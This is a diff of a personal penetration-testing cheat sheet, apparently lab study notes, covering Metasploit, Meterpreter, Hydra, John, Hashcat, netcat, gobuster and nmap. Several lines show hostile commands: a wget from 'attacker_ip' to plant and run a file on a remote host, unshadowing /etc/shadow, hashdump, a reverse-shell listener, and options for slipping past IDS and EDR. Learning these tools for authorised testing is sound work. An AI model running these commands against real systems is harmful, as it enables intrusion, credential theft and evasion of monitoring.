@@ -1,13 +1,13 @@
 LINUX
 	nslookup (Name Server Lookup)
-		nslookup (FLAGS) {domain}
+		nslookup (FLAGS) {DOMAIN}
 		FLAGS
-			-type=PTR {IP_Address} | reverse DNS lookup
+			-type=PTR {IP} | reverse DNS lookup
 
-	dig (FQDN finder)
-		dig (FLAGS) {domain.com} @{IP}
+	dig (DNS Lookup)
+		dig (RECORD) {domain.com} @{IP}
 		FLAGS
-			record types
+			RECORD TYPES
 				A  | Find IPv4 addresses
 				AAAA | Find IPv6 addresses
 				TXT | Find text records (api keys, tokens or flags)
@@ -18,17 +18,19 @@ LINUX
 			Zone Transfer
 				axfr | used to find private A and CNAME records linked to the NS domain (internal records)
 
-	dnsenum (DNS subdomains enum)
-		dnsenum -f foo/bar --dnsserver {DNS_SERVER_IP} {subdomain}.domain.com
+	dnsenum (DNS subdomains enumeration)
+		dnsenum -f {WORDLIST} --dnsserver {DNS_SERVER} {subdomain}.domain.com
 		FLAGS
 			-f | sets the wordlist for subdomains enum
-			-o 
-			-p
+			-o | output file
+			-p | set Threads
+			-r | recursive, further enumerate the found subdomain
 
-	RPCclient (MSRPC, administration tool)
-		rpcclient (FLAGS) {ip_address}
+	RPCclient (MSRPC Administration tool)
+		rpcclient (FLAGS) {IP}
 			-U "domain/username%password"| to log in as a user (can leave blank if share isn't secured)
-		after connecting
+
+		AFTER CONNECTING
 			srvinfo | display Server information
 			enumdomains | enumerate all domains in the network
 			querydominfo | provides domain, server and user information of deployed domains
@@ -38,9 +40,12 @@ LINUX
 			queryuser <RID> | provides info about a specific user
 
 	SMBclient (SMB)
-		smbclient (FLAGS) //{ip_address}
+		smbclient //{ip_address}/{SHARE} (FLAGS)
+		FLAGS
 			-N | null session, this lets you anonymously connect to a target's SMB share.
 			-L | lists all the server's shares
+			-U USER | Authenticate as user
+		
 		after connecting
 			!<cmd> to execute local system commands
 			help | to get all the commands you can run
@@ -48,65 +53,71 @@ LINUX
 	mount (NFS, mounts)
 		showmount (FLAGS) {IP}
 		FLAGS
-			-e | list all mounts
-			-a | show client names and folders they're using
+			-e | list all shares
+			-a | show client names and mounted directories
 			-d | show only directories the user uses
-			-v | print version number only
+			-v | verbose output (version grabbing)
 	
-		mkdir targer_nfs
-		sudo mount (FLAGS) {IP}:/mounted_nfs ./target_nfs
+		mkdir target_nfs
+		
+		sudo mount -t nfs -o nolock {IP}:/share ./target_nfs
 		FLAGS
-			-t nfs | tell mount we're connecting to an NFS share
-			-o nolock | so we can read the files
+			-t nfs | mount as NFS
+			-o nolock | disables file locking
 
-	Reverse Shells
+	Reverse Shells / File Transfer
 		python3 -m http.server 9000
 			wget http://attacker_ip:9000/file_path to download file to remote pc
-		./path_to_file to run the .elf file
+
+		Execute ELF:
+			chmod +x {FILE}
+			./path_to_file to run the .elf file
 	Msfvenom
-		msfvenom (FLAGS) (Options)
+		msfvenom (FLAGS)
 		FLAGS
-			-l payloads/encoders | lists all payloads/encoders
-			-p {payload} specifies payload to use
-			-f | specifies format of the payload
-			-e | encodes the payload to avoid IDS and obsfucates
-			-o | outputs to file
+			-l payloads/encoders 	| lists all payloads/encoders
+			-p {payload} 		| specifies payload to use
+			-f 			| specifies format of the payload
+			-e 			| encodes the payload to avoid IDS and obsfucates
+			-o 			| outputs to file
 		
 
 	Metasploit
 		msfconsole to enter
-		use {xyz} to enter exploit module
-		show options to show all parameters available to be set
-		set {parameter} {value} sets parameter in the exploit youre in. Resets upon leaving. (can also set files as values from host pc)
-			setg to set parameters for all other modules if using the same parameter.
+		use {MODULE} 		| to enter exploit module
+		show options 		| to show all parameters available to be set
+		set {parameter} {value} | sets parameter in the exploit youre in. Resets upon leaving. (can also set files 					  as values from host pc)
+			setg		| to set parameters for all other modules if using the same parameter.
 			unset all/payload
 			unsetg xyz
-		info {exploit} or be in exploit and enter info for detailed informations
-		exploit (or run) to run the exploit
-			-z to do it in the background
-			ctrl z or "background" in meterpreter
+
+		info {exploit} 		| detailed informations about exploit
+		exploit/run 		| run the exploit
+			-z 		| run it in the background
+			ctrl z / "background" in meterpreter
+
 		sessions to show background connections
 			-i {x-z} to select the session
 			-k {id} to kill or leave id to kill all
 			
-		back leaves the exploit
- 		search (flag)
+		back 			| exit exploit
+ 		search (FLAG)
 		FLAGS
 			type:value (exploit, payload, auxiliary, encoder, evasion, post, nop)
 			name:value
 			platform:value (windows, linux etc...)
-			cve:value
+			cve:CVE-XXXX-XXXX
 	Meterpreter
-		help lists all the commands
-		guid gets the GUID of the session
-		search -f {file_string} used to find files
-		hashdump dumps all the hashes in the SAM
-		getuid display user privileges and rights
-		ps to display all processes.
-		migrate {process_id} to migrate to a process (useful for keystroke scan on certain apps like Excel, Word etc...)
+		help			| lists all the commands
+		guid 			| gets the GUID of the session
+		search -f {file_string} | used to find files
+		hashdump 		| dumps all the hashes in the SAM
+		getuid 			| display user privileges and rights
+		ps 			| to display all processes.
+		migrate {process_id} 	| to migrate to a process (useful for keystroke scan on certain apps like Excel, 					  Word etc...)
 		use "xyz" when refering to paths
 	Hydra
-		hydra (FLAGS) {IP_Address} {service}
+		hydra (FLAGS) {IP} 
 		FLAGS
 			-l <username> sets the user for login
 			-P </Wordlist/path> to set the password wordlist
@@ -115,28 +126,32 @@ LINUX
 			ssh to set SSH login
 
 		sudo hydra -l -p {IP} http-post-form "loginURL:username=^USER^&password=^PASS^:F=incorrect"
-			this is for web forms, GET or POST Methods
+		this is for web forms, GET or POST Methods
+	
 	John The Ripper
 		unshadow /etc/passwd /etc/shadow > unshadowed.txt
-			passwd clear readable general user data
-			shadow is where password hashes are stored, needs admin priv. thats what you want to crack
-		john (option) (file to crack path)
+			passwd 		| clear readable general user data
+			shadow 		| is where password hashes are stored, needs admin privs.
+
+		john (FLAGS) (file to crack path)
 		FLAGS
-			--wordlist={wordlist path} determines what wordlist to use
-			--format={format} determines the hash format
+			--wordlist={WORDLIST}
+			--format={HASH_FORMAT} 
 				--list=formats to find out what formats john supports
 			--single single cracking mode
 
-		ssh/rar/zip2john {zipfile} > {ziphash.txt}
-			makes the hash readable for john to crack.
+		CONVERSION TOOLS
+		zip2john file.zip > hash.txt
+		rar2john file.rar > hash.txt
+		ssh2john id_rsa   > hash.txt
 
 	Hashcat
-		hashcat -m x -a y {hashfile} {wordlist}
+		hashcat -m {MODE} -a {ATTACK} {HASHFILE} {WORDLIST}
 		FLAGS
 			-m specifies the hashtype in numeric format, e.g -m 1000 is NTLM. use man hashcat for more codes.
 			-a specifies the attackmode, -a 0 = 1 password after the other from the wordlist
-			hashfile is the hash you want to crack
-			wordlist speaks for itself.
+		EXAMPLE
+			hashcat -m 1000 -a 0 hashes.txt rockyou.txt
 	Hashes
 		md5sum {file}
 		sha1sum
@@ -144,22 +159,25 @@ LINUX
 		sha512sum
 			outputs the hash as a hexadecimal
 		
-		generally passwords are saved as hashes not as cleartext. The password entered gets converted to a hash and compared to the hash saved. Hashes are very hard to reverse engineer so its way safer than just storing 			cleartext passwords.
-		You can salt hashes by adding a string to the original cleartext before it gets hashed which changes the hash drastically
-		Linux stores these password hashes in /etc/shadow only readable by root. Line contains 9fields seperated by :
-		Password fields are saved in this format $prefix$options$salt$hash			prefix determines the encryption hashing scheme
-	NetCat,ncat (banner grabbing and reverse bind shells)
-		nc (FLAGS) {IP} {Port}
+		generally passwords are saved as hashes not as cleartext. The password entered gets converted to a hash and 		compared to the hash saved. Hashes are very hard to reverse engineer so its way safer than just storing 		cleartext passwords.
+		You can salt hashes by adding a string to the original cleartext before it gets hashed which changes the 		hash drastically
+		Linux stores these password hashes in /etc/shadow only readable by root. Line contains 9 fields seperated 		by :
+		Password fields are saved in this format $prefix$options$salt$hash		prefix determines the encryption hashing scheme
+
+	Netcat,ncat (Banner grabbing / Reverse bind shells)
+		nc (FLAGS) {IP} {PORT}
 		FLAGS
-			-l | puts ncat in listening mode for incoming connections
-			-z | sends no data, used for port scanning
-			-u | uses UDP instead of TCP
+			-l | Listening mode for incoming connections
+			-z | Port scanning
+			-u | uses UDP
 			-v | verbose mode
 			-n | don't resolve IP addresses
-		you can use a combination of more flags together, something like nc -lvnp x y
+
+		EXAMPLE
+			nc -lnvp 4444
 
 	Whatweb
-		whatweb {IP_ADDRESS}
+		whatweb {IP}
 			to find out what kind of server a website uses if nc banner grabbing doesn't work
 
 	Gobuster
@@ -167,44 +185,51 @@ LINUX
 		FLAGS
 			--help
 			dir to use directory/file enumeration mode
-				-u {URL} to set the target
-				-w {/path/to/wordlist} to set the wordlist
-				-t to set the threads used
-				-r to redirect you to moved urls
-				-x .extension to find files with these extensions
-				-o {File} to output the results into a file
+				-u {URL} 			| to set the target
+				-w {WORDLIST}			| to set the wordlist
+				-t 				| to set the threads used
+				-r 				| to redirect you to moved urls
+				-x .extension 			| to find files with these extensions
+				-o {File} 			| to output the results into a file
+
 			dns to use subdomain enumeration
-				-c show CNAME records (can't use with -i flag)
-				-i shows ip addresses that the domain and subdomain resolve to
-				-d for the domain you want to enumerate
+				-c 				| show CNAME records (can't use with -i flag)
+				-i 				| shows ip addresses that the domain and subdomain resolve
+				-d 				| for the domain you want to enumerate
+
 			vhost to brute force virtual hosts (different websites hosted on the same host)
-				-u {URL} to set the target
-				--domain {2nd & 3rd lvl Domain} to set the domain if set with IP
-				--append-domain to add the set domain to every entry to not get false positives
-				--exclude-length x-y to ignore certain status codes that don't interest us
-				-m to set the http method (GET, POST)
-				-r follow redirects
+				-u {URL} 			| to set the target
+				--domain {2nd & 3rd lvl Domain} | to set the domain if set with IP
+				--append-domain 		| to add the set domain to every entry to not get false 								  positives
+				--exclude-length x-y 		| to ignore certain status codes that don't interest us
+				-m 				| to set the http method (GET, POST)
+				-r 				| follow redirects
+		EXAMPLE
+			gobuster dir -u inlanefreight.htb -w rockyou.txt -r
+			
 	NMap
 		nmap (IP)/24 (FLAGS) (SCRIPTS)
 		FLAGS
-			-sn ping scan host (no ports, only active hosts)
-			-sL List Target IPs/names
-			-sT TCP connect, complete Handshake
-			-sS stealth scan, only 1st step of Handshake
-			-sU UDP scan
-			-F scans only 100 most common ports (instead of 1000)
-			-pX-Y scans ports from x to y. -p- scans EVERY port.
-			-O OS detection (isn't always reliable)
-			-sV Service Version scan
-			-A O & sV together plus other things
-			-Pn treat every Host as Online and force scan.
-			-v verbosity level (-v or -vv)
-			-oN {filename} -saves as normal output
-			-oG GREPable output
-			-D RND:xyz to set up decoy IP adresses. Your IP will be put in that pool of random IP Adresses. Combine it with a proxy.
-			--disable-arp-ping to disable arp pinging. This is better at evading EDRs as it forces a L3 ping and does not come across as a high frequency ping sweep/tcp request
-			--source-port xyz to force nmap to send traffic from the chosen port
-			--data-length xyz adds a random extra data to the packet frame so they do not look like standard nmap probes (some EDRs look into it)
+			-sn 				| ping scan host (no ports, only active hosts)
+			-sL 				| List Target IPs/names
+			-sT 				| TCP connect, complete Handshake
+			-sS 				| stealth scan, only 1st step of Handshake
+			-sU 				| UDP scan
+			-F 				| scans only 100 most common ports (instead of 1000)
+			-pX-Y 				| scans ports from x to y. -p- scans EVERY port.
+			-O 				| OS detection (isn't always reliable)
+			-sV 				| Service Version scan
+			-A 				| O & sV together plus other things
+			-Pn 				| treat every Host as online and force scan.
+			-v 				| verbosity level (-v or -vv)
+			-oN {FILENAME} 			| saves as normal output
+			-oG 				| GREPable output
+			-D RND:xyz 			| to set up decoy IP adresses. Your IP will be put in that pool of 							  random IP Adresses. Combine it with a proxy.
+
+			--disable-arp-ping 		| to disable arp pinging. This is better at evading EDRs as it 								  forces a L3 ping and does not come across as a high frequency 							  ping sweep/tcp request
+
+			--source-port xyz 		| to force nmap to send traffic from the chosen port
+			--data-length xyz 		| adds a random extra data to the packet frame so they do not look 							  like standard nmap probes (some EDRs look into it)
 		TIMINGS
 			-T0 paranoid 9.8h for 100 most common ports (5 min between each port)
 			-T1 sneaky 27.53 min for 100p (15 sec between every 2 ports)
@@ -213,20 +238,21 @@ LINUX
 			-T4 aggressive 0.13 sec for 100p
 		SCRIPTS (categories)
 			Needs to always start with --script xyz
-			auth | Determination of authentication credentials.
-			brute | Executes scripts that try to log in to the respective service by brute-forcing with credentials.
-			discovery | Evaluation of accessible services.
-			exploit | This category of scripts tries to exploit known vulnerabilities for the scanned port.
-			version | Extension for service detection.
-			vuln | Identification of specific vulnerabilities.
+			auth 				| Determination of authentication credentials.
+			brute 				| Executes scripts that try to log in to the respective service by 							  brute-forcing with credentials.
+			discovery 			| Evaluation of accessible services.
+			exploit 			| This category of scripts tries to exploit known vulnerabilities 							  for the scanned port.
+
+			version 			| Extension for service detection.
+			vuln 				| Identification of specific vulnerabilities.
 
 	Linux
-		ls (optional flags)
+		ls (FLAGS)
 		cd
 		cat
-		head -n (how many lines)
-		find -name {file} (can use * for anything)
-		grep "string" {file} (-r = recursively thru all files inside a dir)
+		head -n (how many lines to read)
+		find -name {FILE} (can use * for anything)
+		grep "string" {FILE} (-r = recursively thru all files inside a dir)
 			grep -r "string" /dir/
 
   	Pathing
@@ -237,13 +263,6 @@ LINUX
 	SSH
 		ssh name@ip
 		scp path/to/file/you/wanna/transfer username@192.168.ip.address:/destination/path/on/other/machine
-	SMB
-		smbclient (FLAGS) \\\\{IP_ADDRESS}
-		FLAGS
-			-L list all the smb shares on the host
-			-N supresses password promt (if smb security mode is "Message signing enabled but not required")
-			-U {User} to log in as a user if you're missing permissions
-				needs to be used like smbclient -U bob \\\\{IP}\\{folder_shared}
 	
 	Telnet
 		Telnet (ip) (port)
@@ -254,15 +273,15 @@ LINUX
 		ip a s
 		sudo tcpdump (FILTERS) (FLAGS)
 		FILTERS
-			host {IP_Address} Limit TO & FROM {IP_Address} host
-			port {Port} Limit TO & FROM {Port} port
-			src xyz host/port Limit FROM xyz host/port
-			dst xyz host/port Limit TO xyz host/port
-			Protocol IP, IP6, UDP, TCP, ICMP or ARP | limits the search for this protocol
+			host {IP}				| Limit TO & FROM {IP} host
+			port {PORT} 				| Limit TO & FROM {PORT} port
+			src xyz host/port 			| Limit FROM xyz host/port
+			dst xyz host/port			| Limit TO xyz host/port
+			Protocol IP, IP6, UDP, TCP, ICMP or ARP | Limits the search for this protocol
 	
-			and Captures packets where both conditions are true
-			or Captures packets when either one of the conditions is true
-			not Captures packets when the condition is not true
+			and 					| Captures packets where both conditions are true
+			or 					| Captures packets when one conditions is true
+			not 					| Captures packets when the condition is not true
 		FLAGS
 			-i eth interface
 			-w save to file
@@ -270,20 +289,7 @@ LINUX
 			-c Limit sniffs to certain count
 			-n dont resolve ip -nn dont resolve protocols
 			-v -vv -vvv verbosity
-	MySQL
-		mysql (FLAGS) {IP}
-		FLAGS
-			-u <user>
-			-p<password> | no space inbetween "-p" flag and password!
-			-h {IP}
-
-		COMMANDS
-			show databases;
-			use <database>;
-			show tables;
-			show columns from <table>;
-			select * from <table>;
-			select * from <table> where <column> = "<string>";
+	
 	
 WINDOWS
 	PowerShell
